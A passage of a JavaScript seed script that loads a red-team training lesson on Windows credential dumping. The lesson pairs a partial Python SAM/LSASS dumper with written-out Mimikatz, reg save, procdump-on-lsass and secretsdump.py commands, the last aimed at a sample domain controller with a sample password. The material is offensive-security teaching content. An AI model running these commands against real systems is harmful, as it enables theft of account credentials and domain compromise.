   - sekurlsa::logonpasswords - LSASS dump
   - lsadump::sam - SAM extraction
   - lsadump::dcsync - Replicate from DC
\`\`\`

### SAM Dumper (Python - from registry)
\`\`\`python
#!/usr/bin/env python3
"""
cred_dump.py - Credential Extraction Tool
Extract hashes from SAM/SYSTEM registry hives
"""

import argparse
import struct
from Crypto.Cipher import DES, ARC4
from Crypto.Hash import MD5
import hashlib

class SAMDumper:
    """Extract hashes from SAM registry hive"""

    def __init__(self, sam_path: str, system_path: str):
        self.sam_path = sam_path
        self.system_path = system_path
        self.bootkey = None

    def get_bootkey(self) -> bytes:
        """Extract bootkey from SYSTEM hive"""
        # The bootkey is derived from LSA secret key
        # Located in SYSTEM\\CurrentControlSet\\Control\\Lsa\\{JD,Skew1,GBG,Data}

        # This is a simplified version - real implementation
        # needs to parse registry hive format

        print("[*] Extracting bootkey from SYSTEM hive...")

        # Permutation table for bootkey
        perm = [0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]

        # In real implementation, read from registry
        # For demo, return placeholder
        self.bootkey = b'\\x00' * 16
        return self.bootkey

    def decrypt_hash(self, rid: int, enc_hash: bytes, key: bytes) -> bytes:
        """Decrypt NT/LM hash using RID and bootkey"""
        # DES keys derived from RID
        des_key1 = self.rid_to_key(rid)
        des_key2 = self.rid_to_key((rid >> 8) | (rid << 24))

        # Decrypt with DES
        cipher1 = DES.new(des_key1, DES.MODE_ECB)
        cipher2 = DES.new(des_key2, DES.MODE_ECB)

        decrypted = cipher1.decrypt(enc_hash[:8]) + cipher2.decrypt(enc_hash[8:])
        return decrypted

    def rid_to_key(self, rid: int) -> bytes:
        """Convert RID to DES key"""
        s = b''
        s += bytes([rid & 0xFF])
        s += bytes([(rid >> 8) & 0xFF])
        s += bytes([(rid >> 16) & 0xFF])
        s += bytes([(rid >> 24) & 0xFF])
        s += bytes([rid & 0xFF])
        s += bytes([(rid >> 8) & 0xFF])
        s += bytes([(rid >> 16) & 0xFF])

        key = b''
        key += bytes([s[0] >> 1])
        key += bytes([((s[0] & 0x01) << 6) | (s[1] >> 2)])
        key += bytes([((s[1] & 0x03) << 5) | (s[2] >> 3)])
        key += bytes([((s[2] & 0x07) << 4) | (s[3] >> 4)])
        key += bytes([((s[3] & 0x0F) << 3) | (s[4] >> 5)])
        key += bytes([((s[4] & 0x1F) << 2) | (s[5] >> 6)])
        key += bytes([((s[5] & 0x3F) << 1) | (s[6] >> 7)])
        key += bytes([s[6] & 0x7F])

        # Add parity bits
        return bytes([(b << 1) & 0xFE for b in key])

    def dump(self) -> list:
        """Dump credentials from SAM"""
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║           Credential Dumper (SAM)                         ║
╚═══════════════════════════════════════════════════════════╝
        """)

        self.get_bootkey()

        # In real implementation, parse SAM hive for users
        # Extract V value which contains encrypted hashes

        print("[*] SAM dumping requires:")
        print("    - SYSTEM hive: bootkey extraction")
        print("    - SAM hive: encrypted hash extraction")
        print("    - Registry parsing: python-registry or manual")
        print()
        print("[*] Alternative: Use secretsdump.py from Impacket")

        return []


class LSASSDumper:
    """
    LSASS memory dump analysis
    Works on minidump files from procdump, Task Manager, etc.
    """

    def __init__(self, dump_path: str):
        self.dump_path = dump_path

    def parse_minidump(self):
        """Parse minidump format"""
        # Minidump header structure
        with open(self.dump_path, 'rb') as f:
            signature = f.read(4)
            if signature != b'MDMP':
                print("[-] Not a valid minidump file")
                return

            version = struct.unpack('<H', f.read(2))[0]
            impl_version = struct.unpack('<H', f.read(2))[0]
            stream_count = struct.unpack('<I', f.read(4))[0]
            stream_dir_rva = struct.unpack('<I', f.read(4))[0]

            print(f"[+] Minidump version: {version}")
            print(f"[+] Streams: {stream_count}")

            # Parse streams to find credentials
            # This is complex - use pypykatz for real implementation

    def analyze(self):
        """Analyze LSASS dump for credentials"""
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║           LSASS Dump Analyzer                             ║
╚═══════════════════════════════════════════════════════════╝
        """)

        print("[*] For LSASS analysis, use pypykatz:")
        print("    pip3 install pypykatz")
        print("    pypykatz lsa minidump lsass.dmp")
        print()
        print("[*] Or analyze with Mimikatz:")
        print("    sekurlsa::minidump lsass.dmp")
        print("    sekurlsa::logonpasswords")


# Impacket-based remote dumping
class RemoteDumper:
    """Remote credential dumping via impacket"""

    def __init__(self, target: str, username: str, password: str, domain: str):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain

    def secretsdump(self):
        """Run secretsdump functionality"""
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║           Remote Credential Dump                          ║
╚═══════════════════════════════════════════════════════════╝

[*] Using impacket secretsdump:

secretsdump.py '{self.domain}/{self.username}:{self.password}@{self.target}'

[*] This will dump:
    - SAM hashes (local accounts)
    - LSA secrets
    - Cached domain credentials
    - NTDS.dit (if DC)

[*] For DCSync:
secretsdump.py -just-dc '{self.domain}/{self.username}:{self.password}@{self.target}'
        """)


def main():
    parser = argparse.ArgumentParser(description='Credential Dumper')
    subparsers = parser.add_subparsers(dest='command')

    # SAM dump
    sam_parser = subparsers.add_parser('sam', help='Dump SAM hive')
    sam_parser.add_argument('--sam', required=True, help='SAM hive path')
    sam_parser.add_argument('--system', required=True, help='SYSTEM hive path')

    # LSASS dump
    lsass_parser = subparsers.add_parser('lsass', help='Analyze LSASS dump')
    lsass_parser.add_argument('--dump', required=True, help='Minidump path')

    # Remote dump
    remote_parser = subparsers.add_parser('remote', help='Remote dump')
    remote_parser.add_argument('-t', '--target', required=True)
    remote_parser.add_argument('-u', '--username', required=True)
    remote_parser.add_argument('-p', '--password', required=True)
    remote_parser.add_argument('-d', '--domain', default='')

    args = parser.parse_args()

    if args.command == 'sam':
        dumper = SAMDumper(args.sam, args.system)
        dumper.dump()
    elif args.command == 'lsass':
        dumper = LSASSDumper(args.dump)
        dumper.analyze()
    elif args.command == 'remote':
        dumper = RemoteDumper(args.target, args.username, args.password, args.domain)
        dumper.secretsdump()
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
\`\`\`

### Key Concepts
\`\`\`
1. SAM Database Location:
   - C:\\Windows\\System32\\config\\SAM
   - Locked while Windows running
   - Copy via: reg save HKLM\\SAM sam.hiv

2. SYSTEM Hive (for bootkey):
   - C:\\Windows\\System32\\config\\SYSTEM
   - reg save HKLM\\SYSTEM system.hiv

3. LSASS Memory:
   - Contains credentials for logged-in users
   - Dump via: procdump -ma lsass.exe lsass.dmp
   - Or: Task Manager > Details > lsass.exe > Create dump

4. Remote Extraction:
   - secretsdump.py uses SMB + registry
   - DCSync uses DRSUAPI replication
\`\`\`

### Usage
\`\`\`bash
# SAM extraction (need SAM and SYSTEM hives)
python3 cred_dump.py sam --sam sam.hiv --system system.hiv

# LSASS analysis
python3 cred_dump.py lsass --dump lsass.dmp

# Remote (shows secretsdump command)
python3 cred_dump.py remote -t 10.30.30.100 -u admin -p 'Pass123' -d corp.local

# Using impacket directly
secretsdump.py 'corp.local/admin:Pass123@10.30.30.100'
\`\`\``, 2, now);

console.log('Seeded: Reimplement Red Team Tools - Part 2 (Web & AD)');
console.log('  - 2 modules, 5 detailed tasks');

sqlite.close();
